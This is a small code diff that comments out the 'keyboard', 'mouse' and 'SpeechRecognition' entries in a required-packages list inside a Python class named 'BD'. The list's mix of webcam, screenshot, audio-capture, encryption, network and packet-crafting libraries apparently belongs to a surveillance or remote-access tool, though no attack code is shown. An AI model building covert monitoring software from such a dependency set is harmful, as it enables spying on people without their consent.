@@ -85,17 +85,17 @@ class BD:
         required_packages = [
             'opencv-python',
             'pyautogui',
-            'keyboard',
+            # 'keyboard',
             'sounddevice',
             'wavio',
             'cryptography',
             'requests',
             'psutil',
             'pywin32',
-            'mouse',
+            # 'mouse',
             'netifaces',
             'scapy',
-            'SpeechRecognition'
+            # 'SpeechRecognition'
         ]
 
         def is_package_installed(package_name):
